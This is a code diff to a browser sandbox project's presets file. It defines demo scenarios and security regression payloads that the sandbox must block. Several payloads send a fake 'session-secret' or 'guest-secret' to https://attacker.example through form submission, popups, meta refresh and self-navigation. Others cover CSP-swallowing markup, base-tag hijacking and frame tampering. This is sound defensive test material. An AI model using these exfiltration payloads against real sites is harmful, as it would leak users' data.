@@ -1,6 +1,11 @@
 /**
- * Playground Presets
- * Pre-defined scenarios to demonstrate sandbox capabilities and testing.
+ * Presets: the scenarios the playground offers for manual testing, and the payloads and rules the
+ * regression specs run (backlog T4). One definition serves both, so an attack is written down once.
+ *
+ * Specs reach a preset only through `fromPreset(id)` (test/e2e/presets.ts). A coverage test
+ * (test/unit/presets.test.ts) scans the spec files for those calls and fails when a preset in the
+ * 'security' category has no spec, when a research reproduction runs no preset, or when a preset names a
+ * research folder whose reproduction does not run it.
  */
 
 import type { SafeCapability } from "../csp-directives";
@@ -9,10 +14,21 @@ import type { SandboxConfig } from "../host";
 export interface Preset {
     id: string;
     label: string;
+    // 'security': an attack the sandbox must stop; every one has a regression spec. 'demo': a feature tour.
+    category: 'security' | 'demo';
+    // How `code` runs: as a script through execute() (needs scriptUnsafe) or as guest markup through load().
+    run: 'script' | 'markup';
     code: string;
     rules: Partial<SandboxConfig>;
     // Registered on the sandbox before it is built (registerFiles); the guest reads them through sandboxFiles.
     files?: Record<string, string>;
+    // A URL in `code` (and every variant) that stands for the attacker: specs aim it at a listener outside the
+    // browser (test/e2e/recorder.ts). The playground keeps it as written.
+    target?: string;
+    // More payloads for the same attack, run by the spec next to `code`; the playground shows `code`.
+    variants?: Record<string, string>;
+    // The research finding this preset reproduces: the folder under docs/research/ whose reproduce.spec.ts runs it.
+    research?: string;
 }
 
 const LOGO_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40" viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#4338ca"/><text x="60" y="26" font-family="sans-serif" font-size="16" fill="#fff" text-anchor="middle">logo.svg</text></svg>';
@@ -21,6 +37,8 @@ export const PRESETS = {
     "basic": {
         id: "basic",
         label: "Basic Interaction",
+        category: "demo",
+        run: "script",
         code: `console.log("Hello from the Sandbox!");
 fetch("https://jsonplaceholder.typicode.com/todos/1")
   .then(r => r.json())
@@ -37,6 +55,10 @@ fetch("https://jsonplaceholder.typicode.com/todos/1")
     "csp-bypass": {
         id: "csp-bypass",
         label: "Security Test: CSP Bypass",
+        category: "security",
+        run: "script",
+        research: "01_csp_bypass",
+        target: "https://example.com/",
         // A nested frame declares a permissive policy of its own. It must still inherit the sandbox's
         // policy (policies only ever add up), so its fetch has to fail. The nested frame raises the
         // violation in its own document, where the sandbox's reporting does not reach, so it relays it.
@@ -58,6 +80,9 @@ setTimeout(() => console.log('TEST_DONE'), 1500);`,
     "sw-tamper": {
         id: "sw-tamper",
         label: "Security Test: SW Tampering",
+        category: "security",
+        run: "script",
+        research: "02_sw_tampering",
         // Having the API object is not access: Firefox exposes navigator.serviceWorker in a sandboxed
         // frame but rejects every call, Chromium throws on reading it. Only a working call counts.
         code: `(async () => {
@@ -74,6 +99,8 @@ setTimeout(() => console.log('TEST_DONE'), 1500);`,
     "worker-timeout": {
         id: "worker-timeout",
         label: "Worker Timeout Test",
+        category: "demo",
+        run: "script",
         code: `console.log("Starting infinite loop...");
 while(true) {}`,
         rules: { mode: "worker", workerExecutionTimeout: 1000, scriptUnsafe: true }
@@ -81,6 +108,8 @@ while(true) {}`,
     "virtual-files-test": {
         id: "virtual-files-test",
         label: "Virtual Files System Test",
+        category: "demo",
+        run: "script",
         // The preset's files are registered on the sandbox; the guest reaches them through sandboxFiles,
         // as blob: URLs created in its own realm (README "Files", ADR-004).
         code: `console.log("Registered files:", sandboxFiles.list().join(", "));
@@ -111,6 +140,10 @@ try { sandboxFiles.url("../main.js"); } catch (e) { console.log("../main.js:", e
     "websocket-bypass": {
         id: "websocket-bypass",
         label: "Security Test: WebSocket Bypass",
+        category: "security",
+        run: "script",
+        research: "04_websocket_bypass",
+        target: "wss://echo.websocket.events",
         code: `try {
     const ws = new WebSocket('wss://echo.websocket.events');
     ws.onopen = () => console.log('PWN_SUCCESS');
@@ -124,11 +157,16 @@ setTimeout(() => console.log('TEST_DONE'), 1000);`,
     "outer-frame-tampering": {
         id: "outer-frame-tampering",
         label: "Security Test: Outer Frame Tampering",
-        code: `try {
-    const p = window.parent.document;
-    console.log('PWN_SUCCESS');
-} catch(e) {
-    console.log('PWN_FAILURE');
+        category: "security",
+        run: "script",
+        research: "05_outer_frame_tampering",
+        code: `for (const [name, get] of [['parent', () => window.parent.document], ['top', () => window.top.document]]) {
+    try {
+        get();
+        console.log('PWN_SUCCESS ' + name);
+    } catch (e) {
+        console.log('PWN_FAILURE ' + name + ' ' + e.name);
+    }
 }
 setTimeout(() => console.log('TEST_DONE'), 100);`,
         rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
@@ -136,6 +174,10 @@ setTimeout(() => console.log('TEST_DONE'), 100);`,
     "monkey-patch-bypass": {
         id: "monkey-patch-bypass",
         label: "Security Test: Monkey Patch Bypass",
+        category: "security",
+        run: "script",
+        research: "09_monkey_patch_bypass",
+        target: "http://example.com",
         code: `fetch('http://example.com')
     .then(() => console.log('PWN_SUCCESS'))
     .catch(() => console.log('PWN_FAILURE'));
@@ -145,6 +187,9 @@ setTimeout(() => console.log('TEST_DONE'), 1000);`,
     "protocol-handler": {
         id: "protocol-handler",
         label: "Security Test: Protocol Handler",
+        category: "security",
+        run: "script",
+        research: "06_protocol_handlers",
         code: `try {
     navigator.registerProtocolHandler('web+test', 'https://example.com?q=%s', 'Test Handler');
     console.log('PWN_SUCCESS: Handler Registered');
@@ -157,6 +202,9 @@ console.log('TEST_DONE');`,
     "data-uri": {
         id: "data-uri",
         label: "Security Test: Data URI Navigation",
+        category: "security",
+        run: "script",
+        research: "07_data_uri_navigation",
         code: `try {
     const dataUrl = 'data:text/html,<h1>PWNED</h1>';
     window.top.location.href = dataUrl;
@@ -169,6 +217,10 @@ console.log('TEST_DONE');`,
     "session-exhaustion": {
         id: "session-exhaustion",
         label: "Security Test: Session Exhaustion",
+        category: "security",
+        run: "script",
+        research: "08_session_exhaustion",
+        target: "/api/session",
         code: `(async () => {
     const start = Date.now();
     let count = 0;
@@ -192,6 +244,10 @@ console.log('TEST_DONE');`,
     "base-tag": {
         id: "base-tag",
         label: "Security Test: Base Tag Hijacking",
+        category: "security",
+        run: "script",
+        research: "10_base_tag_hijacking",
+        target: "https://google.com",
         code: `try {
     const base = document.createElement('base');
     base.href = 'https://google.com';
@@ -210,39 +266,42 @@ setTimeout(() => console.log('TEST_DONE'), 2000);`,
     "storage-sharing": {
         id: "storage-sharing",
         label: "Security Test: Storage Sharing",
-        code: `// Write
+        category: "security",
+        run: "script",
+        research: "03_storage_sharing",
+        // Reads before it writes: run it, start a fresh sandbox (or reload the page) and run it again. The
+        // second read must never return the first run's secret.
+        code: `try {
+    console.log('Read: ' + localStorage.getItem('SECRET'));
+} catch (e) {
+    console.log('Read Failed: ' + e.name);
+}
 try {
     localStorage.setItem('SECRET', '123');
     console.log('Write Done');
-} catch(e) {
-    console.log('Write Failed');
+} catch (e) {
+    console.log('Write Failed: ' + e.name);
 }
-
-// Read (Simulated in same execution for preset simplicity, but in test it's separate)
-try {
-    const val = localStorage.getItem('SECRET');
-    console.log('Read: ' + val);
-} catch(e) {
-    console.log('Read Failed');
-}
-    console.log('TEST_DONE');`,
+console.log('TEST_DONE');`,
         rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "alert-test": {
         id: "alert-test",
         label: "Security Test: Block Alert/Dialog",
-        code: `try {
-    alert("If you see this, alert() is not blocked");
-    console.log('PWN_SUCCESS');
-} catch (e) {
-    console.log('PWN_FAILURE: ' + e.message);
-}
+        category: "security",
+        run: "script",
+        // Without allow-modals the browser ignores alert(): it returns at once and shows nothing, so only the
+        // host can tell whether a dialog appeared (the spec watches for one).
+        code: `alert("If you see this, alert() is not blocked");
+console.log('ALERT_RETURNED');
 console.log('TEST_DONE');`,
         rules: { scriptUnsafe: true, capabilities: ["allow-scripts",] }
     },
     "allow-same-origin": {
         id: "allow-same-origin",
         label: "Security Test: allow-same-origin Filter",
+        category: "security",
+        run: "script",
         code: `if (window.origin !== 'null') {
     console.log('PWN_SUCCESS: allow-same-origin was NOT filtered!');
 } else {
@@ -254,6 +313,8 @@ console.log('TEST_DONE');`,
     "allow-top-nav": {
         id: "allow-top-nav",
         label: "Security Test: allow-top-navigation Filter",
+        category: "security",
+        run: "script",
         code: `try {
     window.top.location.href = 'about:blank';
     console.log('PWN_SUCCESS: Top navigation allowed!');
@@ -266,13 +327,18 @@ console.log('TEST_DONE');`,
     "allow-popups-escape": {
         id: "allow-popups-escape",
         label: "Security Test: allow-popups-to-escape-sandbox Filter",
+        category: "security",
+        run: "script",
+        target: "https://example.com/",
+        // A sandboxed popup keeps the sandbox, so the page it loads has an opaque origin ('null'); one that
+        // escaped would run with that page's own origin.
         code: `(async () => {
     console.log("Note: 'allow-popups' is permitted, but 'allow-popups-to-escape-sandbox' is filtered.");
     console.log("This test requires you to allow popups for this site in your browser settings.");
-    const win = window.open('about:blank', '_blank');
+    const win = window.open('https://example.com/', '_blank');
     if (win) {
         console.log("PWN_INFO: Popup opened (as expected via allow-popups).");
-        console.log("If the filter worked, this new window is STILL sandboxed and cannot escape to the host origin.");
+        console.log("If the filter worked, this new window is STILL sandboxed: the page in it has an opaque origin.");
     } else {
         console.log("PWN_FAILURE: Popup was blocked by the browser's popup blocker. Please allow popups and run again.");
     }
@@ -283,6 +349,8 @@ console.log('TEST_DONE');`,
     "local-html-page": {
         id: "local-html-page",
         label: "Local HTML Page Test",
+        category: "demo",
+        run: "markup",
         code: `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -378,5 +446,73 @@ console.log('TEST_DONE');`,
             capabilities: ["allow-scripts"],
         },
         files: { "logo.svg": LOGO_SVG },
-    }
+    },
+    "csp-swallow": {
+        id: "csp-swallow",
+        label: "Security Test: Markup That Swallows the CSP",
+        category: "security",
+        run: "markup",
+        research: "11_meta_csp_delivery",
+        // Guest markup that would hide or displace the injected policy if it were spliced into the markup
+        // (an implicitly closed <head>, a comment, raw text). The policy must stay the first element of <head>.
+        code: `<html><head><img src=x><!--</head><body></body></html>`,
+        variants: {
+            "comment around head": `<html><body><!-- <head> --></body></html>`,
+            "comment before html": `<!-- <html><head> --><html><head></head><body></body></html>`,
+            "full document": `<!DOCTYPE html><html lang="en"><head><title>t</title></head><body><p>full document</p></body></html>`,
+            "textarea": `<textarea><head></textarea>`,
+            "plaintext": `<plaintext>`,
+        },
+        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+    },
+    "form-action-exfil": {
+        id: "form-action-exfil",
+        label: "Security Test: Form Submission Exfiltration",
+        category: "security",
+        run: "markup",
+        research: "12_non_fallback_directives",
+        target: "https://attacker.example/exfil",
+        // form-action has no default-src fallback: the default policy must still refuse the submission.
+        code: `<form id="f" action="https://attacker.example/exfil" method="GET">
+  <input name="stolen" value="session-secret">
+</form>
+<script>document.getElementById('f').submit();</script>`,
+        rules: { scriptUnsafe: true, capabilities: ["allow-scripts", "allow-forms"] }
+    },
+    "popup-exfiltration": {
+        id: "popup-exfiltration",
+        label: "Security Test: Popup Exfiltration",
+        category: "security",
+        run: "script",
+        research: "13_popup_exfiltration",
+        target: "https://attacker.example",
+        // A popup is a new top-level window that no CSP governs: its URL carries data out. allow-popups passed
+        // as a regular capability is dropped (with a warning); only unsafeCapabilities enables it.
+        code: `let outcome;
+try {
+    outcome = window.open('https://attacker.example/?leak=guest-secret') ? 'opened' : 'refused';
+} catch (e) {
+    outcome = 'refused'; // Firefox throws where popups are not allowed; the others return null
+}
+console.log('POPUP ' + outcome);`,
+        rules: { scriptUnsafe: true, capabilities: ["allow-scripts", "allow-popups" as SafeCapability] }
+    },
+    "self-navigation": {
+        id: "self-navigation",
+        label: "Security Test: Self-Navigation Exfiltration",
+        category: "security",
+        run: "markup",
+        research: "14_self_navigation",
+        target: "https://attacker.example",
+        // No CSP directive governs where a document navigates itself; the wrapper frame's frame-src 'none' does.
+        code: `<script>setTimeout(() => { location.href = 'https://attacker.example/?d=guest-secret'; }, 50)</script>`,
+        variants: {
+            "window.open _self": `<script>setTimeout(() => { window.open('https://attacker.example/?d=guest-secret', '_self'); }, 50)</script>`,
+            "link click": `<a id="a" href="https://attacker.example/?d=guest-secret">x</a><script>setTimeout(() => document.getElementById('a').click(), 50)</script>`,
+            "meta refresh": `<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=guest-secret">`,
+        },
+        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+    },
 } satisfies Record<string, Preset>;
+
+export type PresetId = keyof typeof PRESETS;
